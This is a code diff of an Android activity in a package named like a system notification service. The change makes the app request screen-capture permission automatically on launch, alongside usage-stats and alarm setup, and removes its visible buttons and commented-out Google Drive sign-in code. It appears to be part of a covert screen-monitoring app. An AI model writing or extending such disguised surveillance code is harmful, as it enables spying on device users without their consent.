@@ -19,39 +19,12 @@ import com.android.systemnotification.utils.ScreenshotManager;
 import androidx.appcompat.app.AppCompatActivity;
 
 public class MainActivity extends AppCompatActivity {
-    private static final int REQUEST_ID = 1;
-    private static final int REQUEST_CODE_SIGN_IN = 2;
-
-    //DriveServiceHelper mDriveServiceHelper;
-
-    //GoogleSignInClient mGoogleSignInClient;
+    private final int REQUEST_ID = 1;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-
-        findViewById(R.id.rootView).setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                findViewById(R.id.rootView).setBackgroundColor(getResources().getColor(R.color.colorAccent));
-            }
-        });
-
-        findViewById(R.id.checkIfPossibleToRecordButton).setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(final View v) {
-                ScreenshotManager.INSTANCE.requestScreenshotPermission(MainActivity.this, REQUEST_ID);
-            }
-        });
-
-        findViewById(R.id.takeScreenshotButton).setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(final View v) {
-                ScreenshotManager.INSTANCE.takeScreenshot(MainActivity.this);
-            }
-        });
 
         requestUsageStatsPermission();
 
@@ -73,7 +46,7 @@ public class MainActivity extends AppCompatActivity {
             alarm.setAlarm(this);
         }
 
-        findViewById(R.id.checkIfPossibleToRecordButton).performClick();
+        ScreenshotManager.INSTANCE.requestScreenshotPermission(MainActivity.this, REQUEST_ID);
     }
 
     @Override
@@ -81,9 +54,6 @@ public class MainActivity extends AppCompatActivity {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQUEST_ID) {
             ScreenshotManager.INSTANCE.onActivityResult(resultCode, data, /*mDriveServiceHelper,*/ MainActivity.this);
-        }
-        else if (requestCode == REQUEST_CODE_SIGN_IN){
-
         }
         finish();
     }
@@ -103,35 +73,4 @@ public class MainActivity extends AppCompatActivity {
         boolean granted = mode == AppOpsManager.MODE_ALLOWED;
         return granted;
     }
-
-    /*@Override
-    protected void onStart() {
-        super.onStart();
-        GoogleSignInAccount account = GoogleSignIn.getLastSignedInAccount(getApplicationContext());
-
-        if (account == null) {
-
-            signIn();
-
-        } else {
-
-            mDriveServiceHelper = new DriveServiceHelper(getGoogleDriveService(getApplicationContext(), account, "appName"));
-        }
-    }
-
-    private void signIn() {
-
-        mGoogleSignInClient = buildGoogleSignInClient();
-        startActivityForResult(mGoogleSignInClient.getSignInIntent(), REQUEST_CODE_SIGN_IN);
-    }
-
-    private GoogleSignInClient buildGoogleSignInClient() {
-        GoogleSignInOptions signInOptions =
-        new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
-                .requestScopes(Drive.SCOPE_FILE)
-                .requestScopes(Drive.SCOPE_APPFOLDER)
-                .requestEmail()
-                .build();
-        return GoogleSignIn.getClient(getApplicationContext(), signInOptions);
-    }*/
 }
